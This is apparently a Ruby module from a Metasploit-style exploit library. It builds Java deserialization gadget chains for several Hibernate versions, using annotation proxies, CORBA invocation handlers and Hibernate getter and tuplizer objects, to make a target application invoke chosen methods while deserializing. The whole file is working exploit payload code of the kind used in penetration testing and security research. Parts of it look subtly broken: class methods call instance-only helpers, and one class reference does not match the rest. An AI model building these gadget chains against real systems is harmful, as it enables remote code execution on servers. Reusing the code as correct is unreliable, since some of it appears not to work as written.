# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Hibernate
          def self.make_annotproxy(cls, attrs = {}, ver = 5)
            if ver == 5
              Model::JavaObject.new('Lorg/hibernate/validator/internal/util/annotationfactory/AnnotationProxy;', 
                                    'annotationType' => cls,
                                    'values' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => attrs))
            elsif ver == 6
              Model::JavaObject.new('Lorg/hibernate/validator/internal/util/annotation/AnnotationProxy;', 
                                    'descriptor' => Model::JavaObject.new('Lorg/hibernate/validator/internal/util/annotation/AnnotationDescriptor;', 
                                                                          'type' => cls,
                                                                          'attributes' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => attrs)))
            else
              raise 'Unsupported version'
            end
          end

          def self.validator_invoke_noarg(obj, clsname, method, ver: 5)
            cls = Model::JavaClass.new(clsname)
            ah1 = make_annotproxy(cls, { method => nil }, ver)
            ah2 = make_annotproxy(cls, {}, ver)
            annoth = Model::JavaObject.new('Lcom/sun/corba/se/spi/orbutil/proxy/CompositeInvocationHandlerImpl;', 
                                           'defaultHandler' => ah2,
                                           'classToInvocationHandler' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                             cls => Util.delegateproxy(obj)
                                           }))

            annot = Model::JavaProxy.new(['java.lang.annotation.Annotation', clsname[1..-2].tr('/', '.')], annoth)
            Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { annot => nil, ah1 => nil })
          end

          def make_typed_value(type, val, ver, entityMode: nil)
            if ver == 3
              Model::JavaObject.new('Lorg/hibernate/engine/TypedValue;', 
                                    'type' => type,
                                    'value' => val,
                                    'entityMode' => entityMode)
            else
              Model::JavaObject.new('Lorg/hibernate/engine/spi/TypedValue;', 
                                    'type' => type,
                                    'value' => val)
            end
          end

          def hibernate3_invoke_noarg(target, cls, method)
            gc = 'Lorg/hibernate/property/Getter;'
            raise 'Unsupported, only getters' unless method.start_with?('get')

            get = Model::JavaObject.new('Lorg/hibernate/property/BasicPropertyAccessor$BasicGetter;', 'clazz' => Java::Serialize::JavaClass.new(cls),
                                                  'propertyName' => method[3].downcase + method[4..-1])

            tup = Model::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 'getters' => JavaArray.new(gc, [get]),
                                                  'propertySpan' => 1)

            pojo = Model::JavaObject.new('Lorg/hibernate/EntityMode;', 'name' => 'POJO')

            tm = Model::JavaObject.new('Lorg/hibernate/tuple/component/ComponentEntityModeToTuplizerMapping;', 
                                       'tuplizers' => Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
              pojo => tup
            }))

            ct = Model::JavaObject.new('Lorg/hibernate/type/ComponentType;', 
                                       'tuplizerMapping' => tm,
                                       'propertySpan' => 1)

            v1 = make_typed_value(ct, target, 3, entityMode: pojo)
            v2 = make_typed_value(ct, target, 3, entityMode: pojo)
            Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { v1 => nil, v2 => nil })
          end

          def self.hibernate_invoke_noarg(target, cls, method, ver: 5)
            return hibernate3_invoke_noarg(target, cls, method) if ver == 3

            gc = ''
            if ver == 5
              get = Model::JavaObject.new('Lorg/hibernate/property/access/spi/GetterMethodImpl$SerialForm;', 
                                          'containerClass' => Model::JavaClass.new(cls),
                                          'propertyName' => 'foo',
                                          'declaringClass' => Model::JavaClass.new(cls),
                                          'methodName' => method)
              gc = 'Lorg/hibernate/property/access/spi/Getter;'
            elsif ver == 4
              gc = 'Lorg/hibernate/property/Getter;'
              raise 'Unsupported, only getters' unless method.start_with?('get')
              get = Model::JavaObject.new('Lorg/hibernate/property/BasicPropertyAccessor$BasicGetter;', 
                                          'clazz' => Model::JavaClass.new(cls),
                                          'propertyName' => method[3].downcase + method[4..-1])
            else
              raise 'Unsupported'
            end

            tup = Model::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 
                                        'getters' => JavaArray.new(gc, [get]),
                                        'propertySpan' => 1)

            ct = Model::JavaObject.new('Lorg/hibernate/type/ComponentType;', 
                                       'componentTuplizer' => tup,
                                       'propertySpan' => 1)

            v1 = make_typed_value(ct, target, ver)
            v2 = make_typed_value(ct, target, ver)
            Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { v1 => nil, v2 => nil })
          end
        end
      end
    end
  end
end
